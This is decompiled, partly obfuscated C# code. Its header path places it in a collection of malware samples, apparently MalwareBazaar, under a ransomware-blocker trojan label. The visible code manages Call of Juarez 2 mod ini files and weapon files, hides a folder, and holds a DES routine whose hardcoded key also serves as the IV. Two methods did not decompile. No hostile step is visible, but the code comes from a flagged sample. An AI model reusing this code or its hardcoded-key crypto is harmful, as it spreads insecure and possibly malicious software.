// Decompiled with JetBrains decompiler
// Type: e6AW.d3D6
// Assembly: Ta5, Version=2.6.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F2E64AE-B66A-489E-BB50-4D7BB52F0C28
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.MSIL.Blocker.gen-af6e8234a2211a8b50c4e4de3f8a268b3ee98cb6bdc94959c4f1cc88ab8e3b66.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Zc7;

namespace e6AW
{
  [StandardModule]
  internal sealed class d3D6
  {
    public static bool CerrarServidor = false;
    public static string modName;
    public static string ModNameComprobacionGuardar = "";
    public static string nombreArchivoObtenido;
    public static string nombreClaseObtenido;
    public static bool cancelModName;
    public static string ruta;
    public static string rutaTemp = "\\temp\\";
    public static string rutaPlayer = "\\CoJ2\\Data\\Player\\";
    public static string rutaAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ModsCoJ2\\";
    public static StreamWriter write;
    public static StreamReader read;
    public static bool vRestart = false;
    public static string ModIniCabecera = "";
    public static string ModIniAristocrat = "";
    public static string ModIniBandit = "";
    public static string ModIniBarnsby = "";
    public static string ModIniDoc = "";
    public static string ModIniGunslinger = "";
    public static string ModIniGunsmith = "";
    public static string ModIniJuarez = "";
    public static string ModIniMiner = "";
    public static string ModIniRifleman = "";
    public static string ModIniSniper = "";
    public static string ModIniThief = "";
    public static string ModIniTrapper = "";
    public static string ModIniTribeWarrior = "";
    public static string ConfiguracionModInicial = "";
    private static object frmArmas;
    public const string sSecretKey = "%c0jm0ds";

    public static void Tx5k()
    {
      d3D6.a6SR("c:\\temp\\test.txt", "c:\\temp\\Encrypted.txt", "%c0jm0ds");
      d3D6.Tm6q("c:\\temp\\Encrypted.txt", "c:\\temp\\Decrypted.txt", "%c0jm0ds");
    }

    public static void a6SR(string x9W0, string i0XS, string Sj71)
    {
      FileStream fileStream1 = new FileStream(x9W0, FileMode.Open, FileAccess.Read);
      FileStream fileStream2 = new FileStream(i0XS, FileMode.Create, FileAccess.Write);
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      cryptoServiceProvider.Key = Encoding.ASCII.GetBytes(Sj71);
      cryptoServiceProvider.IV = Encoding.ASCII.GetBytes(Sj71);
      ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, encryptor, CryptoStreamMode.Write);
      byte[] numArray = new byte[checked ((int) (fileStream1.Length - 1L) + 1)];
      fileStream1.Read(numArray, 0, numArray.Length);
      cryptoStream.Write(numArray, 0, numArray.Length);
      cryptoStream.Close();
    }

    public static void Tm6q(string Jk0e, string Rd18, string n1ET)
    {
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      cryptoServiceProvider.Key = Encoding.ASCII.GetBytes(n1ET);
      cryptoServiceProvider.IV = Encoding.ASCII.GetBytes(n1ET);
      CryptoStream cryptoStream = new CryptoStream((Stream) new FileStream(Jk0e, FileMode.Open, FileAccess.Read), cryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read);
      StreamWriter streamWriter = new StreamWriter(Rd18);
      streamWriter.Write(new StreamReader((Stream) cryptoStream).ReadToEnd());
      streamWriter.Flush();
      streamWriter.Close();
    }

    public static void Mx7c()
    {
      if (!File.Exists(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini\\mod.ini"))
        return;
      d3D6.read = File.OpenText(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini\\mod.ini");
      string end = d3D6.read.ReadToEnd();
      string str = end.Substring(0, checked (end.Length - 2));
      d3D6.read.Close();
      d3D6.ModIniCabecera = str.Substring(0, 1).ToString();
      int num1 = 1;
      do
      {
        switch (num1)
        {
          case 1:
            string Expression1 = "Aristocrat";
            int num2 = str.IndexOf(Expression1);
            if (num2 > -1)
            {
              d3D6.ModIniAristocrat = str.Substring(checked (num2 + Strings.Len(Expression1)), 10).ToString();
              break;
            }
            break;
          case 2:
            string Expression2 = "Bandit";
            int num3 = str.IndexOf(Expression2);
            if (num3 > -1)
            {
              d3D6.ModIniBandit = str.Substring(checked (num3 + Strings.Len(Expression2)), 10).ToString();
              break;
            }
            break;
          case 3:
            string Expression3 = "Barnsby";
            int num4 = str.IndexOf(Expression3);
            if (num4 > -1)
            {
              d3D6.ModIniBarnsby = str.Substring(checked (num4 + Strings.Len(Expression3)), 10).ToString();
              break;
            }
            break;
          case 4:
            string Expression4 = "Doc";
            int num5 = str.IndexOf(Expression4);
            if (num5 > -1)
            {
              d3D6.ModIniDoc = str.Substring(checked (num5 + Strings.Len(Expression4)), 10).ToString();
              break;
            }
            break;
          case 5:
            string Expression5 = "Gunslinger";
            int num6 = str.IndexOf(Expression5);
            if (num6 > -1)
            {
              d3D6.ModIniGunslinger = str.Substring(checked (num6 + Strings.Len(Expression5)), 10).ToString();
              break;
            }
            break;
          case 6:
            string Expression6 = "Gunsmith";
            int num7 = str.IndexOf(Expression6);
            if (num7 > -1)
            {
              d3D6.ModIniGunsmith = str.Substring(checked (num7 + Strings.Len(Expression6)), 10).ToString();
              break;
            }
            break;
          case 7:
            string Expression7 = "Juarez";
            int num8 = str.IndexOf(Expression7);
            if (num8 > -1)
            {
              d3D6.ModIniJuarez = str.Substring(checked (num8 + Strings.Len(Expression7)), 10).ToString();
              break;
            }
            break;
          case 8:
            string Expression8 = "Miner";
            int num9 = str.IndexOf(Expression8);
            if (num9 > -1)
            {
              d3D6.ModIniMiner = str.Substring(checked (num9 + Strings.Len(Expression8)), 10).ToString();
              break;
            }
            break;
          case 9:
            string Expression9 = "Rifleman";
            int num10 = str.IndexOf(Expression9);
            if (num10 > -1)
            {
              d3D6.ModIniRifleman = str.Substring(checked (num10 + Strings.Len(Expression9)), 10).ToString();
              break;
            }
            break;
          case 10:
            string Expression10 = "Sniper";
            int num11 = str.IndexOf(Expression10);
            if (num11 > -1)
            {
              d3D6.ModIniSniper = str.Substring(checked (num11 + Strings.Len(Expression10)), 10).ToString();
              break;
            }
            break;
          case 11:
            string Expression11 = "Thief";
            int num12 = str.IndexOf(Expression11);
            if (num12 > -1)
            {
              d3D6.ModIniThief = str.Substring(checked (num12 + Strings.Len(Expression11)), 10).ToString();
              break;
            }
            break;
          case 12:
            string Expression12 = "Trapper";
            int num13 = str.IndexOf(Expression12);
            if (num13 > -1)
            {
              d3D6.ModIniTrapper = str.Substring(checked (num13 + Strings.Len(Expression12)), 10).ToString();
              break;
            }
            break;
          case 13:
            string Expression13 = "TribeWarrior";
            int num14 = str.IndexOf(Expression13);
            if (num14 > -1)
              d3D6.ModIniTribeWarrior = str.Substring(checked (num14 + Strings.Len(Expression13)), 10).ToString();
            break;
        }
        checked { ++num1; }
      }
      while (num1 <= 13);
      d3D6.ConfiguracionModInicial = str;
    }

    public static void Ry90()
    {
      if (Directory.Exists(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini"))
        Dd8.Computer.FileSystem.DeleteDirectory(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini", DeleteDirectoryOption.DeleteAllContents);
      Dd8.Computer.FileSystem.CreateDirectory(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini");
      string str = "";
      if (Operators.CompareString(d3D6.ModIniCabecera, "", false) == 0)
        d3D6.ModIniCabecera = "0";
      if (Operators.CompareString(d3D6.ModIniCabecera, "", false) != 0)
        str += d3D6.ModIniCabecera;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniAristocrat), "", false) != 0)
        str = str + "Aristocrat" + d3D6.ModIniAristocrat;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniBandit), "", false) != 0)
        str = str + "Bandit" + d3D6.ModIniBandit;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniBarnsby), "", false) != 0)
        str = str + "Barnsby" + d3D6.ModIniBarnsby;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniDoc), "", false) != 0)
        str = str + "Doc" + d3D6.ModIniDoc;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniGunslinger), "", false) != 0)
        str = str + "Gunslinger" + d3D6.ModIniGunslinger;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniGunsmith), "", false) != 0)
        str = str + "Gunsmith" + d3D6.ModIniGunsmith;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniJuarez), "", false) != 0)
        str = str + "Juarez" + d3D6.ModIniJuarez;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniMiner), "", false) != 0)
        str = str + "Miner" + d3D6.ModIniMiner;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniRifleman), "", false) != 0)
        str = str + "Rifleman" + d3D6.ModIniRifleman;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniSniper), "", false) != 0)
        str = str + "Sniper" + d3D6.ModIniSniper;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniThief), "", false) != 0)
        str = str + "Thief" + d3D6.ModIniThief;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniTrapper), "", false) != 0)
        str = str + "Trapper" + d3D6.ModIniTrapper;
      if (Operators.CompareString(Strings.Trim(d3D6.ModIniTribeWarrior), "", false) != 0)
        str = str + "TribeWarrior" + d3D6.ModIniTribeWarrior;
      d3D6.write = File.AppendText(d3D6.rutaAppData + "\\Mods\\" + d3D6.modName + "\\ini\\mod.ini");
      d3D6.write.WriteLine(str);
      d3D6.write.Close();
    }

    public static void Zn93(string Ps7t)
    {
      if (Operators.CompareString(Ps7t, "Aristocrat", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Aristocrat_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Bandit", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Bandit_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Barnsby", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Barnsby_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Doc", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Doc_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Gunslinger", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Gunslinger_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Gunsmith", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Gunsmith_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Juarez", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Juarez_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Miner", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Miner_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Rifleman", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Rifleman_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Sniper", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Sniper_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Thief", false) == 0)
        d3D6.nombreArchivoObtenido = "_NetWeapon_Thief_Properties.scr";
      else if (Operators.CompareString(Ps7t, "Trapper", false) == 0)
      {
        d3D6.nombreArchivoObtenido = "_NetWeapon_Trapper_Properties.scr";
      }
      else
      {
        if (Operators.CompareString(Ps7t, "Tribe Warrior", false) != 0)
          return;
        d3D6.nombreArchivoObtenido = "_NetWeapon_TribeWarrior_Properties.scr";
      }
    }

    public static void Me54(string b4T2)
    {
      if (Operators.CompareString(b4T2, "_NetWeapon_Aristocrat_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Aristocrat";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Bandit_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Bandit";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Barnsby_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Barnsby";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Doc_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Doc";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Gunslinger_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Gunslinger";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Gunsmith_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Gunsmith";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Juarez_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Juarez";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Miner_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Miner";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Rifleman_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Rifleman";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Sniper_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Sniper";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Thief_Properties.scr", false) == 0)
        d3D6.nombreClaseObtenido = "Thief";
      else if (Operators.CompareString(b4T2, "_NetWeapon_Trapper_Properties.scr", false) == 0)
      {
        d3D6.nombreClaseObtenido = "Trapper";
      }
      else
      {
        if (Operators.CompareString(b4T2, "_NetWeapon_TribeWarrior_Properties.scr", false) != 0)
          return;
        d3D6.nombreClaseObtenido = "Tribe Warrior";
      }
    }

    public static void Ea64(string x2K1)
    {
      if (!Dd8.Computer.FileSystem.DirectoryExists(d3D6.ruta + d3D6.rutaTemp))
        return;
      Dd8.Computer.FileSystem.GetDirectoryInfo(x2K1).Attributes = FileAttributes.Hidden;
    }

    static void Bj53()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Kt86()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
